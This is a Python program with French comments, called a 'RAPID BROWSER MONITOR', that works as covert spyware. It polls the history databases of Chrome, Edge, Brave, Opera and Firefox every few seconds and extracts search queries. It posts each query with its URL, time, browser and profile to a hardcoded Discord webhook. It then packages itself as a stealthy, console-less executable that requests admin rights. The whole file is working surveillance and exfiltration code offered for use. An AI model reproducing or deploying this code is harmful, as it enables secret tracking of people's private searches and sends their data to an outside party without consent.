import sqlite3, os, time, requests, sys, subprocess, shutil, glob, winreg, re
from datetime import datetime, timedelta
from pathlib import Path
import threading

# ═══════════════════════════════════════════════════════════════════════════════
# 📡 WEBHOOK PRÉ-CONFIGURÉ ✅
# ═══════════════════════════════════════════════════════════════════════════════
WEBHOOK_URL = "https://discord.com/api/webhooks/1483378838305112094/1Y-eyMHKIH_0lsSWvekzBNBR-TFlzTTgNAmhxkP2X4qVKAQOhpIeTcNB5knMLcdn5-Zo"
sent_searches = set()
last_scan = 0
scan_lock = threading.Lock()

# ⏱️ INTERVALLES ULTRA-OPTIMISÉS
SCAN_INTERVAL = 3      # Réduit à 3s
LOOKBACK_MINUTES = 5   # Réduit pour plus de réactivité
RESULTS_PER_BROWSER = 5 # Réduit pour moins de charge

# ═══════════════════════════════════════════════════════════════════════════════
# 🔍 REGEX ULTRA-PUISSANT (TOUS MOTEURS)
# ═══════════════════════════════════════════════════════════════════════════════
SEARCH_PATTERNS = {
    r'duckduckgo\.com/?\?q=([^&\s]+)': '🦆 DuckDuckGo',
    r'bing\.com/search\?q=([^&\s]+)': '🔵 Bing',
    r'yahoo\.com/search\?p=([^&\s]+)': '🟡 Yahoo',
    r'google\.[^/]+/search\?q=([^&\s]+)': '🔴 Google',
    r'startpage\.com/do/search\?query=([^&\s]+)': '🟢 Startpage',
    r'qwant\.com/\?q=([^&\s]+)': '🔷 Qwant',
    r'brave\.com/search\?q=([^&\s]+)': '🦁 Brave',
    r'search\.encrypt\?q=([^&\s]+)': '🔒 SearxNG',
    r'ecosia\.org/search\?q=([^&\s]+)': '🌳 Ecosia',
    r'gibiru\.com/results\.html\?q=([^&\s]+)': '🛡️ Gibiru',
    r'yandex\.[^/]+/search/\?text=([^&\s]+)': '🔸 Yandex',
    r'ddg.gg/\?q=([^&\s]+)': '🦆 DDG Mobile',
    r'q=([^&\s]+)': '🌐 Generic'  # Fallback
}

def extract_query_and_engine(url):
    """🚀 Extraction ultra-rapide query + moteur"""
    for pattern, engine in SEARCH_PATTERNS.items():
        match = re.search(pattern, url, re.IGNORECASE)
        if match:
            try:
                query = requests.utils.unquote(match.group(1).replace('+', ' '))
                return query[:100], engine
            except:
                pass
    return "unknown", "🌐 Unknown"

# ═══════════════════════════════════════════════════════════════════════════════
# 📤 WEBHOOK OPTIMISÉ (ASYNCHRONE)
# ═══════════════════════════════════════════════════════════════════════════════
def send_webhook_async(query, url, ts, browser, profile="", engine=""):
    """📤 Envoi webhook en arrière-plan (zéro latence)"""
    def send():
        key = f"{query}_{ts}_{browser}_{profile}"
        if key in sent_searches:
            return
        sent_searches.add(key)
        
        fields = [
            {"name":"🔎 Recherche","value":f"`{query}`","inline":False},
            {"name":"🌐 URL","value":f"`{url[:60]}...`","inline":True},
            {"name":"🕒 Heure","value":f"`{ts}`","inline":True}
        ]
        if profile: fields.insert(1, {"name":"👤 Profil","value":f"`{profile}`","inline":True})
        if engine: fields.insert(-1, {"name":"🔍 Moteur","value":engine,"inline":True})
        
        try:
            requests.post(WEBHOOK_URL, json={
                "embeds":[{"title":f"🔍 {browser}","color":0x5865F2,"fields":fields}]
            }, timeout=2)
        except:
            pass
    
    # Thread séparé = ZÉRO impact perf
    threading.Thread(target=send, daemon=True).start()

# ═══════════════════════════════════════════════════════════════════════════════
# 🔎 SCAN CHROMIUM ULTRA-OPTIMISÉ
# ═══════════════════════════════════════════════════════════════════════════════
def scan_chromium_fast(browser_info):
    """⚡ Scan Chromium ultra-rapide (1 thread/navigateur)"""
    user_data = browser_info["path"]
    if not os.path.exists(user_data): 
        return

    # Profils Chromium accéléré
    profile_paths = [
        "Default/History",
        "Profile 1/History", 
        "Profile 2/History",
        "Profile 3/History",
        "profile.default/History"
    ]
    
    cutoff = datetime.now() - timedelta(minutes=LOOKBACK_MINUTES)
    time_param = int((cutoff-datetime(1601,1,1)).total_seconds()*10**6)  # Fix microsecondes
    
    for profile_path in profile_paths:
        db_path = os.path.join(user_data, profile_path)
        if not os.path.exists(db_path): 
            continue
            
        try:
            # Connexion ultra-rapide
            conn = sqlite3.connect(f'file:{db_path}?mode=ro&cache=shared', uri=True, timeout=1)
            conn.execute("PRAGMA cache_size = 1000")  # Cache optimisé
            c = conn.cursor()
            
            # Requête MEGA-OPTIMISÉE (tous moteurs en 1)
            c.execute("""
                SELECT url,title,last_visit_time FROM urls 
                WHERE last_visit_time > ? AND (
                    url LIKE '%search%' OR url LIKE '%q=%' OR url LIKE '%query=?'
                ) ORDER BY last_visit_time DESC LIMIT ?
            """, (time_param, RESULTS_PER_BROWSER))
            
            for url, title, visit_time in c.fetchall():
                if len(sent_searches) > 1000:  # Anti-flood
                    break
                    
                ts = (datetime(1601,1,1) + timedelta(microseconds=visit_time)).strftime("%H:%M:%S")
                query, engine = extract_query_and_engine(url)
                if query != "unknown":
                    send_webhook_async(query, url, ts, browser_info["name"], 
                                     profile_path.split('/')[0], engine)
            
            conn.close()
        except:
            continue

# ═══════════════════════════════════════════════════════════════════════════════
# 🦊 SCAN FIREFOX ULTRA-RAPIDE
# ═══════════════════════════════════════════════════════════════════════════════
def scan_firefox_fast(browser_name, db_path):
    """🦊 Scan Firefox ultra-rapide"""
    try:
        cutoff = datetime.now() - timedelta(minutes=LOOKBACK_MINUTES)
        time_param = int(cutoff.timestamp() * 1000000)
        
        conn = sqlite3.connect(f'file:{db_path}?mode=ro&cache=shared', uri=True, timeout=1)
        c = conn.cursor()
        
        c.execute("""
            SELECT url,title,last_visit_date FROM moz_places 
            WHERE last_visit_date > ? AND (
                url LIKE '%search%' OR url LIKE '%q=%' OR url LIKE '%query=%'
            ) ORDER BY last_visit_date DESC LIMIT ?
        """, (time_param, RESULTS_PER_BROWSER))
        
        profile = Path(db_path).parent.name[:10]
        for url, title, visit_time in c.fetchall():
            ts = datetime.fromtimestamp(visit_time/1000000).strftime("%H:%M:%S")
            query, engine = extract_query_and_engine(url)
            if query != "unknown":
                send_webhook_async(query, url, ts, browser_name, profile, engine)
        
        conn.close()
    except:
        pass

# ═══════════════════════════════════════════════════════════════════════════════
# 🎯 SCAN PARALLÈLE (MULTI-THREADING)
# ═══════════════════════════════════════════════════════════════════════════════
def scan_all_browsers_fast():
    """🚀 Scan parallèle tous navigateurs (x10 vitesse)"""
    with scan_lock:
        print(f"⚡ RAPID-SCAN [{datetime.now().strftime('%H:%M:%S')}]")
        
        # Chromium en parallèle
        browsers = get_all_browser_paths()
        threads = []
        
        for browser_info in browsers[:10]:  # Limite 10 pour perf
            t = threading.Thread(target=scan_chromium_fast, args=(browser_info,))
            t.daemon = True
            t.start()
            threads.append(t)
        
        # Firefox rapide
        firefox_dbs = []
        bases = [os.environ.get("APPDATA", ""), os.path.expanduser("~")]
        for base in bases:
            firefox_dbs.extend(glob.glob(os.path.join(base, "**", "places.sqlite"), recursive=True))
        
        for db_path in firefox_dbs[:5]:  # Limite 5
            t = threading.Thread(target=scan_firefox_fast, args=("Firefox", db_path))
            t.daemon = True
            t.start()
            threads.append(t)
        
        # Attendre fin threads
        for t in threads:
            t.join(timeout=1)

def get_all_browser_paths():
    """🔍 Détection rapide navigateurs (cache)"""
    # Version simplifiée ultra-rapide
    common_paths = [
        ("Chrome", os.path.join(os.environ.get("LOCALAPPDATA", ""), "Google", "Chrome", "User Data")),
        ("Edge", os.path.join(os.environ.get("LOCALAPPDATA", ""), "Microsoft", "Edge", "User Data")),
        ("Brave", os.path.join(os.environ.get("LOCALAPPDATA", ""), "BraveSoftware", "Brave-Browser", "User Data")),
        ("Opera", os.path.join(os.environ.get("APPDATA", ""), "Opera Software", "Opera Stable"))
    ]
    
    paths = []
    for name, path in common_paths:
        if os.path.exists(path):
            paths.append({"name": name, "path": path})
    return paths

# ═══════════════════════════════════════════════════════════════════════════════
# 🔨 COMPILATION OPTIMISÉE
# ═══════════════════════════════════════════════════════════════════════════════
def auto_compile_exe():
    if getattr(sys, 'frozen', False): return
    
    print("🔨 RAPID_monitor.exe ultra-furtif...")
    cmd = [
        'pyinstaller', '--onefile', '--noconsole', '--noconfirm',
        '--uac-admin' if os.name == 'nt' else '',
        '--distpath=.', sys.argv[0]
    ]
    subprocess.run(cmd, shell=True)
    print("✅ RAPID_monitor.exe créé!")
    sys.exit(0)

# ═══════════════════════════════════════════════════════════════════════════════
# ▶️ MAIN ULTRA-OPTIMISÉ
# ═══════════════════════════════════════════════════════════════════════════════
if __name__ == "__main__":
    print("🚀 RAPID BROWSER MONITOR v3.0 | 3s scans | 100% moteurs")
    auto_compile_exe()
    
    while True:
        if time.time() - last_scan > SCAN_INTERVAL:
            scan_all_browsers_fast()
            last_scan = time.time()
        time.sleep(0.1)  # CPU-friendly